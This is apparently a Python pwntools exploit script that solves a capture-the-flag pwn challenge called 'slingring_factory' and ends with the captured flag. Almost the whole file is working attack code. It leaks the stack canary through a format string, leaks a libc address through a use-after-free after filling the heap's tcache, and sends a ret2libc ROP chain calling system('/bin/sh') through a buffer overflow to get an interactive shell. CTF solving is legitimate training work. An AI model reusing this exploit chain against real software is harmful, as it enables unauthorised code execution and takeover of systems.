#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="info"
import time
import os
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
gdb_script='''
'''

path="./slingring_factory"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="challs.nusgreyhats.org"
PORT= 35678
context.binary = elf
p=process(path)
libc=ELF("./libc.so.6")
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)
if argument=='g':
	p=process(path)
	gdb.attach(p,gdbscript=gdb_script)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
def forge(n):
  p.sendlineafter(b">>", b"2")
  p.sendlineafter(b"rings!", str(n)) # this is basically create
  p.sendlineafter(b":", b"a")
  p.sendlineafter(b":", b"1")
  p.sendline()
def disc(n):
  p.sendlineafter(b">>", b"3")  # this is free at an index
  p.sendlineafter(b"discard?", str(n))
def use(spell):
	sla(">>","4") # the place where you have the buffer overflow bug 
	sla(":","1")
	sla(":",spell)
def display():
  p.sendlineafter(b">>","1") # this is the UAF bug display libc
  p.sendline()
sla("name?","%7$p")
leak=int(ru("Welcome").split()[1].decode(),16)  #leak canary
print(f"\033[92mCanary {leak}\033[0m")
for i in range(9):
	forge(i) # create more that 7 to make it go to the unsorted bin and 1 more to prevent attaching with topchunk
for i in range(8):
	disc(i) # free everything to get the libc leak 
display() # leak
leak_libc=uu64(ru("#8").split()[-3])
libc.address=leak_libc- 0x21ace0 # to get the libc base
print(f"\033[92mLibc base {hex(libc.address)}\033[0m")
rop=ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
payload=flat({0x38:p64(leak)+p64(0)+rop.chain()}) # a standard ret2libc 
use(payload)
p.clean()
ia()
#grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}